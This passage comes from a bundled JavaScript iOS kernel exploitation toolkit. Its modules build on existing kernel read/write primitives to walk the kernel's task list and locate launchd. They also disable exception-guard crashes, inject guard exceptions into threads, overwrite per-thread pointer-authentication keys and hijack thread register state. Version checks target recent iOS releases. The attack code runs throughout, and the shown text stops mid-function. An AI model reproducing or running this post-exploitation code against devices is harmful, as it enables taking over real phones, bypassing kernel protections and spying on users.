	static KALLOC_ARRAY_TYPE_SHIFT;

	static {
		this.gSelfTask = new _SelfTaskStruct__WEBPACK_IMPORTED_MODULE_0__["default"]();
	}

	static init(selfTaskAddr)
	{
		// Update KALLOC_ARRAY_TYPE_SHIFT
		this.KALLOC_ARRAY_TYPE_SHIFT = BigInt((64n - libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().T1SZ_BOOT - 1n));

		/*
		 * This function should be invoked as the initializer of the this Task utility.
		 * It setups the global var "gSelfTask" containing values used all across the task functions to lookup ports.
		 * It also retrieves the "launchd" task address.
		 */
		this.gSelfTask.addr = selfTaskAddr;
		let spaceTable = this.#getSpaceTable(this.gSelfTask.addr);
		this.gSelfTask.portObject = this.#getPortObject(spaceTable, 0x203n);
		this.gSelfTask.launchdTask = this.#searchForLaunchdTask();

		console.log(TAG,`Self task address: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(this.gSelfTask.addr)}`);
		console.log(TAG,`Self task space table: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(spaceTable)}`);
		console.log(TAG,`Self task port object: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(this.gSelfTask.portObject)}`);
		console.log(TAG,`launchd task: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(this.gSelfTask.launchdTask)}`);
	}

	static trunc_page(addr)
	{
		return addr & (~(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].PAGE_SIZE - 1n));
	}

	static round_page(addr)
	{
		return this.trunc_page((addr) + (libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].PAGE_SIZE - 1n));
	}

	static pidof(name)
	{
		let currTask = this.gSelfTask.launchdTask;
		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pComm, command, 18);
			let resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].readString(command,18);
			if(name === resultName)
			{
				let pid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pid);
				return pid;
			}
			let nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().nextTask);
			if (!nextTask || nextTask == currTask)
				break;
			currTask = nextTask;
		}
		return 0;
	}

	static getTaskAddrByPID(pid)
	{
		let currTask = this.gSelfTask.launchdTask;

		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pid);
			if (currPid == pid)
				return currTask;
			let nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().nextTask);
			if (!nextTask || (nextTask == currTask))
				break;
			currTask = nextTask;
		}
		return 0;
	}

	static disableExcGuardKill(taskAddr)
	{
		// in mach_port_guard_ast, the victim would crash if these are on.
		let excGuard = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().excGuard);
		//console.log(TAG,`Current excGuard:0x${Utils.hex(excGuard)}`);
		excGuard &= ~(TASK_EXC_GUARD_MP_CORPSE | TASK_EXC_GUARD_MP_FATAL);
		excGuard |= TASK_EXC_GUARD_MP_DELIVER;
		//console.log(TAG,`ExcGuard result:0x${Utils.hex(excGuard)}`);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].write32(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().excGuard, excGuard);
	}

	static getTaskAddrByName(name)
	{
		let currTask = this.gSelfTask.launchdTask;
		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let command = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pComm, command, 18);
			let resultName = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].readString(command,18);
			//console.log(TAG, `${Utils.hex(procAddr)}: ${resultName}`);
			if(name === resultName)
			{
				//console.log(TAG, `Found target process: ${name}`);
				return currTask;
			}
			let nextTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().nextTask);
			if (!nextTask || nextTask == currTask)
				break;
			currTask = nextTask;
		}
		return false;
	}

	static getRightAddr(port)
	{
		let spaceTable = this.#getSpaceTable(this.gSelfTask.addr);
		return this.#getPortEntry(spaceTable, port);
	}

	static #getSpaceTable(taskAddr)
	{
		let space = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().ipcSpace);
		let spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(space + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().spaceTable);
		//console.log(TAG,`space: ${Utils.hex(space)}`);
		//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);
		spaceTable = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(spaceTable);
		//console.log(TAG,`spaceTable: ${Utils.hex(spaceTable)}`);
		return this.#kallocArrayDecodeAddr(BigInt(spaceTable));
	}

	static #mach_port_index(port)
	{
		return ((port) >> 8n);
	}

	static #getPortEntry(spaceTable, port)
	{
		let portIndex = this.#mach_port_index(port);
		return spaceTable + (portIndex * 0x18n);
	}

	static #getPortObject(spaceTable, port)
	{
		//console.log(TAG, `getPortObject(): space=${Utils.hex(spaceTable)}, port=${Utils.hex(port)}`);
		let portEntry = this.#getPortEntry(spaceTable, port);
		//console.log(TAG,`portEntry: ${Utils.hex(portEntry)}`);
		let portObject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(portEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().entryObject);
		//console.log(TAG,`portObject:${Utils.hex(portObject)}`);
		return libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(portObject);
	}

	static getTaskProc(taskAddr)
	{
		let procROAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().procRO);
		let procAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(procROAddr);
		return procAddr;
	}

	static #searchForLaunchdTask()
	{
		/*
		 * Traverse the tasks list backwards starting from the self task until we find the proc with PID 1.
		 */

		let currTask = this.gSelfTask.addr;
		while (true)
		{
			let procAddr = this.getTaskProc(currTask);
			let currPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read32(procAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().pid);
			if (currPid == 1)
				return currTask;
			let prevTask = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(currTask + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().prevTask);
			if (!prevTask || prevTask === currTask)
				break;
			currTask = prevTask;
		}
		return 0n;
	}

	static #kallocArrayDecodeAddr(ptr)
	{
		let zone_mask = BigInt(1) << BigInt(this.KALLOC_ARRAY_TYPE_SHIFT);
		if (ptr & zone_mask)
		{
			ptr &= ~0x1fn;
		}
		else
		{
			ptr &= ~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].PAGE_MASK;
			//console.log(TAG,`ptr:${Utils.hex(ptr)}`);
			ptr |= zone_mask;
			//console.log(TAG,`ptr2:${Utils.hex(ptr)}`);
		}
		return ptr;
	}

	static getPortAddr(port)
	{
		if (!port)
			return 0;
		let spaceTable = this.#getSpaceTable(this.gSelfTask.addr);
		return this.#getPortObject(spaceTable, port);
	}

	static getPortKObject(port)
	{
		let portObject = this.getPortAddr(port);
		return this.#getPortKObjectByAddr(portObject);
	}

	static #getPortKObjectByAddr(portObject)
	{
		if (!portObject)
			return 0;
		let kobject = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(portObject + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().objectKObject);
		return libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].strip(kobject);
	}

	static firstThread(taskAddr)
	{
		let first = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().threads);
		return first;
	}

	static getMap(taskAddr)
	{
		let vmMap = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].offsets().mapTask);
		return vmMap;
	}

	static getPortKObjectOfTask(taskAddr,port)
	{
		let portObject = this.getPortAddrOfTask(taskAddr, port);
		return this.#getPortKObjectByAddr(portObject);
	}

	static getPortAddrOfTask(taskAddr, port)
	{
		let spaceTable = this.#getSpaceTable(taskAddr);
		return this.#getPortObject(spaceTable, port);
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/TaskRop.js":
/*!*************************************!*\
  !*** ./src/libs/TaskRop/TaskRop.js ***!
  \*************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ TaskRop)
/* harmony export */ });
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");




const TAG = "TASKROP"

class TaskRop
{
	static init()
	{
		let selfTaskAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].getSelfTaskAddr();
		if (!selfTaskAddr)
		{
			console.log(TAG,`Unable to find self task address`);
			return;
		}	
		console.log(TAG,`selfTaskAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].hex(selfTaskAddr)}`);
		_Task__WEBPACK_IMPORTED_MODULE_2__["default"].init(selfTaskAddr);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/Thread.js":
/*!************************************!*\
  !*** ./src/libs/TaskRop/Thread.js ***!
  \************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ Thread)
/* harmony export */ });
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");





const AST_GUARD = 0x1000;
const TAG = "THREAD";

class Thread
{
	static getTro(thread)
	{
		let tro = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().tro);
		// Ignore threads with invalid tro address.
		if (!(tro & 0xf000000000000000n))
		{
			//console.log(TAG,`Got invalid tro of thread:${Utils.hex(thread)} and value:${Utils.hex(tro)}`);
			return 0n;
		}
		return tro;
	}
	static getCtid(thread)
	{
		let ctid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ctid);
		return ctid;
	}
	static getTask(thread)
	{
		let tro = this.getTro(thread);
		// Ignore threads with invalid tro address.
		if (!(tro & 0xf000000000000000n) || tro === 0n)
			return 0n;
		let task = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(tro + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().troTask);
		return task;
	}
	static next(thread)
	{
		if (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].strip(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().taskThreads) < 0xffffffd000000000n)
			return 0;
		let next = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().taskThreads);
		if (next < 0xffffffd000000000n)
			return 0;
		return next;
	}
	static setMutex(thread,ctid)
	{
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().mutexData, ctid);
	}
	static getMutex(thread)
	{
		let mutex = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().mutexData);
		return mutex;
	}
	static getStack(thread)
	{
		let stackptr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().kstackptr);
		return stackptr;
	}
	static injectGuardException(thread,code)
	{
		if(!this.getTro(thread))
		{
			console.log(TAG,`got invalid tro of thread, not injecting exception since thread is dead`);
			return false;
		}

		// 18.4+
		if (xnuVersion.major == 24 && xnuVersion.minor >= 4) {
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0x17n);
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode + 0x8n, code);
		}
		else {
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, code);
		}

		let ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast);
		ast |= AST_GUARD;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast, ast);
		return true;
	}
	static clearGuardException(thread)
	{
		if(!this.getTro(thread))
		{
			console.log(TAG,`got invalid tro of thread, still clearing exception to avoid crash`);
		}
		let ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast);
		ast &= ~AST_GUARD | 0x80000000;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ast, ast);

		// 18.4+
		if (xnuVersion.major == 24 && xnuVersion.minor >= 4) {
			if (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode) == 0x17n) {
				libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0n);
				libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode + 0x8n, 0n);
			}
		}
		else {
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().guardExcCode, 0n);
		}
	}
	static getOptions(thread)
	{
		let options = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().options);
		return options;
	}
	static setOptions(thread, options)
	{
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().options, options);
	}
	static getRopPid(thread)
	{
		let ropPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ropPid);
		return ropPid;
	}
	static getJopPid(thread)
	{
		let jopPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().jopPid);
		return jopPid;
	}
	static setPACKeys(thread, keyA, keyB)
	{
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().ropPid, keyA);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().jopPid, keyB);
	}

	static getState(machThread)
	{
		let statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
		let stateCountPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem + 0x200n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].write32(stateCountPtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT);
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].callSymbol("thread_get_state",
			machThread,
			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64,
			statePtr,
			stateCountPtr);
		if (kr != 0) {
			console.log(TAG, "Unable to read thread state");
			return false;
		}

		let stateBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].read(statePtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_SIZE);
		let state = new _ThreadState__WEBPACK_IMPORTED_MODULE_2__["default"](stateBuff);
		return state;
	}

	static setState(machThread, threadAddr, state)
	{
		let options = 0;
		if (threadAddr) {
			options = Thread.getOptions(threadAddr);
			options |= 0x8000;
			Thread.setOptions(threadAddr, options);
		}

		let statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].write(statePtr, state.buffer);
		//console.log(TAG,`thread:${Utils.hex(thread)}`);
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].callSymbol("thread_set_state",
			machThread,
			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64,
			statePtr,
			libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__["default"].ARM_THREAD_STATE64_COUNT);
		if (kr != 0)
		{
			console.log(TAG,`Failed thread_set_state with error:${kr}`);
			return false;
		}

		if (threadAddr) {
			options &= ~0x8000;
			Thread.setOptions(threadAddr, options);
		}
		return true;
	}

	static resume(machThread)
	{
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__["default"].callSymbol("thread_resume", machThread);
		if (kr != 0) {
			console.log(TAG, "Unable to resume suspended thread");
			return false;
		}
		return true;
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/ThreadState.js":
/*!*****************************************!*\
  !*** ./src/libs/TaskRop/ThreadState.js ***!
  \*****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ ThreadState)
/* harmony export */ });
/* harmony import */ var _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./RegistersStruct */ "./src/libs/TaskRop/RegistersStruct.js");


class ThreadState
{
	#buffer;
	#dataView;
	constructor(buffer, offset = 0)
	{
		this.#buffer = buffer;
		this.#dataView = new DataView(buffer,offset);
		this.registers = new _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__["default"](buffer,offset);
	}
	get buffer()
	{
		return this.#buffer;
	}
	get opaque_fp()
	{
		return this.#dataView.getBigUint64(232,true);
	}
	set opaque_fp(value)
	{
		this.#dataView.setBigUint64(232,value,true);
	}
	get opaque_lr()
	{
		return this.#dataView.getBigUint64(240,true);
	}
	set opaque_lr(value)
	{
		this.#dataView.setBigUint64(240,value,true);
	}
	get opaque_sp()
	{
		return this.#dataView.getBigUint64(248,true);
	}
	set opaque_sp(value)
	{
		this.#dataView.setBigUint64(248,value,true);
	}
	get opaque_pc()
	{
		return this.#dataView.getBigUint64(256,true);
	}
	set opaque_pc(value)
	{
		this.#dataView.setBigUint64(256,value,true);
	}
	get cpsr()
	{
		return this.#dataView.getUint32(264,true);
	}
	set cpsr(value)
	{
		this.#dataView.setUint32(264,value,true);
	}
	get opaque_flags()
	{
		return this.#dataView.getUint32(268,true);
	}
	set opaque_flags(value)
	{
		this.#dataView.setUint32(268,value,true);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/VM.js":
/*!********************************!*\
  !*** ./src/libs/TaskRop/VM.js ***!
  \********************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ VM)
/* harmony export */ });
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./VmMapEntry */ "./src/libs/TaskRop/VmMapEntry.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var _VMObject__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./VMObject */ "./src/libs/TaskRop/VMObject.js");
/* harmony import */ var _VMShmem__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./VMShmem */ "./src/libs/TaskRop/VMShmem.js");
/* harmony import */ var _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./VmPackingParams */ "./src/libs/TaskRop/VmPackingParams.js");









const TAG = "VM";
const VME_ALIAS_BITS = 12n;
const VME_OFFSET_BITS = (64n - VME_ALIAS_BITS);
const VME_OFFSET_SHIFT = VME_ALIAS_BITS;
const VME_SUBMAP_SHIFT = 2n;
const VME_SUBMAP_BITS = (8n * 8n - VME_SUBMAP_SHIFT);
const VM_KERNEL_POINTER_SIGNIFICANT_BITS = 38;
const VM_MAX_KERNEL_ADDRESS = 0xfffffffbffffffffn;
const VM_PAGE_PACKED_PTR_BITS = 31;
const VM_PAGE_PACKED_PTR_SHIFT = 6;
const SIZE_VMOBJECT = 0x20;
const VM_LINK_SIZE = 0x20;
const VM_MAP_ENTRY_SIZE = 0x50;
const VMShmem_SIZE = 0x18;
const VMPackingSize = 0x10;
const VM_FLAGS_ANYWHERE = 0x00000001n;

class VM
{
	static VM_PROT_READ = 1n;
	static VM_PROT_WRITE = 2n;
	static VM_PROT_EXECUTE = 4n;
	static VM_PROT_ALL = (this.VM_PROT_READ|this.VM_PROT_WRITE|this.VM_PROT_EXECUTE);
	static VM_PROT_IS_MASK = 0x40n;
	static VM_INHERIT_NONE = 2n;

	static #Tib(x)
	{
		return ((0n + (x)) << 40n);
	}
	static #Gib(x)
	{
		return ((0n + (x)) << 30n);
	}
	static #VM_MIN_KERNEL_ADDRESS()
	{
		return ((0n - this.#Gib(144n)));
	}
	static #VM_MIN_KERNEL_AND_KEXT_ADDRESS()
	{
		return this.#VM_MIN_KERNEL_ADDRESS();
	}
	static #VM_PAGE_PACKED_PTR_BASE()
	{
		return this.#VM_MIN_KERNEL_AND_KEXT_ADDRESS();
	}
	static #VM_PACKING_IS_BASE_RELATIVE(packed)
	{
		return ((packed.vmpp_bits + packed.vmpp_shift) <= VM_KERNEL_POINTER_SIGNIFICANT_BITS);
	}
	static #VM_PACKING_PARAMS(ns)
	{
		ns.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(ns);
		return ns;
	}
	static #VM_UNPACK_POINTER(packed, ns)
	{
		return this.#vm_unpack_pointer(packed,this.#VM_PACKING_PARAMS(ns));
	}
	static #VM_PACK_POINTER(ptr, ns)
	{
		return this.#vm_pack_pointer(ptr, this.#VM_PACKING_PARAMS(ns));
	}
	static #bigUint64ToIntptr(bigUint64) {
		// Create a BigInt mask for the lower 64 bits
		const lower64BitsMask = BigInt("0xFFFFFFFFFFFFFFFF");

		// Apply the mask to ensure the value is within the range of 64 bits
		bigUint64 = bigUint64 & lower64BitsMask;

		// Check if the value is greater than the maximum signed 64-bit integer
		if (bigUint64 > BigInt("0x7FFFFFFFFFFFFFFF")) {
			// Convert to signed by subtracting 2^64
			return Number(bigUint64 - BigInt("0x10000000000000000"));
		} else {
			// Directly convert to Number
			return Number(bigUint64);
		}
	}
	static #vm_unpack_pointer(packed, params)
	{
		if (!params.vmpp_base_relative)
		{
			//console.log(TAG,`In first if unpack`);
			//let addr = this.#bigUint64ToIntptr(BigInt(packed));
			let addr = packed;
			addr <<= 64 - params.vmpp_bits;
			addr >>= 64 - params.vmpp_bits - params.vmpp_shift;
			return addr;
		}
		if (packed)
		{
			//console.log(TAG,`In second if unpack`);
			return (BigInt(packed) << BigInt(params.vmpp_shift)) + BigInt(params.vmpp_base);
		}
		return 0n;
	}
	static #vm_pack_pointer(ptr,params)
	{
		if (!params.vmpp_base_relative)
		{
			//console.log(TAG,`In first if pack`);
			return ptr >> params.vmpp_shift;
		}
		if (ptr)
		{
			//console.log(TAG,`In second if pack`);
			return (BigInt(ptr) - BigInt(params.vmpp_base)) >> BigInt(params.vmpp_shift);
		}
		return 0n;
	}
	static #VME_OFFSET(entry)
	{
		return entry.vme_offset << 12n;
	}
	static #trunc_page_kernel(x)
	{
		//return ((x) & (~vm_kernel_page_mask));
		return ((x) & (~libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].PAGE_MASK));
	}
	static #round_page_kernel(x)
	{
		//return this.#trunc_page_kernel((x) + vm_kernel_page_mask);
		return this.#trunc_page_kernel((x) + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].PAGE_MASK);
	}
	static #vm_getEntry(map,address)
	{
		let rbhRoot = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(map + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().hdrRBHRoot);
		
		//console.log(TAG,`Get entry:${Utils.hex(address)}`);
		//console.log(TAG,`rbh root:${Utils.hex(rbhRoot)}`);
	
		let rbEntry = rbhRoot;
		let foundEntry = 0n;
	
		while (rbEntry != 0n)
		{
			let curPtr = rbEntry - 0x20n; // container_of(rb_entry, struct vm_map_entry, store)
			//uint64_t prev = 0;
	
			let links = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read(curPtr, links, VM_LINK_SIZE);
			let linksBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(links,VM_LINK_SIZE);
			let linksArray = new Uint8Array(linksBuffer);
			links = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_links(linksArray);
	
			//console.log(TAG,`[${Utils.hex(links.start)} - ${Utils.hex(links.end)}]:${Utils.hex(curPtr)}`);
	
			if (address >= links.start)
			{
